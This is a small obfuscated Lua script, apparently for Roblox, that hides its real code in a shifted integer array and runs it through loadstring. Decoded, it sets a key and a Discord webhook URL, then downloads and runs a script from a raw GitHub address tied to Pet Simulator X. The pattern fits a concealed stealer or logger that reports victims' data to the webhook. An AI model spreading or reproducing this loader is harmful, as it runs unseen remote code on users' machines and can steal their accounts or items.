-- // Obfuscated by https://discord.gg/YXXmCnrjHS

function EKzzSpTPAj(mode)
    RSVhpUyOIXV = {65187, 3, -21, -46, -17, 9, 29, -60, -60, -31, -60, -60, -58, 19, 19, 19, 8, 16, 5, -14, 19, -24, 7, 5, -15, -58, -82, 3, -21, -46, -27, 25, 24, 12, -9, 9, 22, 26, 9, 22, -60, -60, -31, -60, -60, -58, 12, 24, 24, 20, 23, -34, -45, -45, 8, 13, 23, 7, 19, 22, 8, -46, 7, 19, 17, -45, 5, 20, 13, -45, 27, 9, 6, 12, 19, 19, 15, 23, -45, -43, -44, -39, -39, -37, -37, -41, -36, -43, -41, -39, -36, -37, -44, -39, -44, -39, -38, -38, -45, -16, -3, -24, 7, 23, 9, 15, -42, -4, 22, 12, -23, 19, 21, -36, 14, 9, -10, -15, 22, 19, -41, -15, 5, -2, -36, -7, -22, 15, -12, -23, 5, -21, 14, 24, 19, 15, -10, 18, 5, -35, 25, 21, 8, 11, 10, -36, -18, 12, -22, -20, 3, -9, 25, -14, 22, -6, -36, -3, -27, 27, -4, -37, -15, 10, 22, 5, 15, -58, -82, 16, 19, 5, 8, 23, 24, 22, 13, 18, 11, -52, 11, 5, 17, 9, -34, -20, 24, 24, 20, -21, 9, 24, -52, -58, 12, 24, 24, 20, 23, -34, -45, -45, 22, 5, 27, -46, 11, 13, 24, 12, 25, 6, 25, 23, 9, 22, 7, 19, 18, 24, 9, 18, 24, -46, 7, 19, 17, -45, 20, 23, 28, -47, -9, 7, 22, 13, 20, 24, 23, -45, 20, 23, 28, 23, 7, -45, 17, 5, 13, 18, -45, 23, 7, 22, 13, 20, 24, -46, 16, 25, 5, -58, -51, -51, -52, -51, -82};
    tMHZAzMdyKju = {};
    iafHEARCVzjZw = "";
    for i,v in pairs(RSVhpUyOIXV) do
        table.insert(tMHZAzMdyKju, v + mode);
    end;
    for i,v in pairs(tMHZAzMdyKju) do
        iafHEARCVzjZw = iafHEARCVzjZw.."\\"..tostring(v)
    end;
    iafHEARCVzjZw = "loadstring('"..iafHEARCVzjZw.."')()"
    loadstring(iafHEARCVzjZw)()
end;

EKzzSpTPAj(92);
